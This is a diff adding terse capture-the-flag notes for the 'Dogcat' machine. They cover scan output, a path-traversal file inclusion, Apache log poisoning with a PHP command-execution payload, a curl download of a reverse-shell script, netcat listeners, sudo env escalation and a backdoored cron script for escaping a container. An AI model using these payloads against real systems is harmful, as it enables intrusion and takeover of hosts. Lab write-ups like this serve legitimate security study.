@@ -1,0 +1,59 @@
+Dogcat 
+
+nmap
+----
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+
+gobuster
+---------
+/.htpasswd            (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/cats                 (Status: 301) [Size: 311] [--> http://10.10.10.117/cats/]
+/index.php            (Status: 200) [Size: 418]
+/server-status        (Status: 403) [Size: 277]
+
+* visiting the site we can choose from the options dog or cat and clicking on the options shows pictures of either dogs or cats according to our choice
+* the interesting thing is that when clicked on the option the url changes to view=dog
+* a possible lfi vulnerability 
+* changing the value of view doesnt seem to work and throws an error saying it must include either dog or cat
+* searching for a php lfi filter 
+* view=dog/../../../../etc/passwd -> this seems to be working
+* visiting the index page 
+* view=dog/../../../../index
+* shows the actual php code and it requires an ext variable  
+* now trying to visit the apache log page
+* view=dog/../../../../var/log/apache2/access.log&ext=
+* this shows that our useragent info is included in the requests and can be leveraged 
+* curl "http://machineip" -H "User-Agent: <?php system(\$_GET['c']); ?>"
+* using the above command to include the c variable for us to exeecute commands 
+* view=dog/../../../../var/log/apache2/access.log/&ext&c=id
+* this seems to be working 
+* using this to upload a reverse shell into the machine
+* setup a python3 server with a rev.php in the folder   
+* view=dog/../../../../var/log/apache2/access.log&ext&c=curl "http://machineIP:port/rev.php" -o rev.php
+* nc -nvlp 4444 
+* we have a shell now 
+* searching for the flags using find 
+* find / -type f -name flag* 2>/dev/null
+
+priv esc
+--------
+* sudo -l tells that we can rum the /usr/bin/env as root
+* visiting gtfobins for an exploit and using it
+* sudo /usr/bin/env /bin/sh
+* and we are root 
+* but we are root in a docker container 
+* found the flag3
+
+trying to priv esc
+------------------
+* found a backup.sh on the .opt folder 
+* the contents of the backup.sh shows that the backup.sh can communucate with the outside envirornment
+* its acting like a cronjob
+* editing the backup.sh file and adding in a netcat reverse shell
+* setup a netcat listener 
+* nc -lnvp 9999
+* after waiting for some time we are root 
+* the final flag in /root/flag.txt
+  
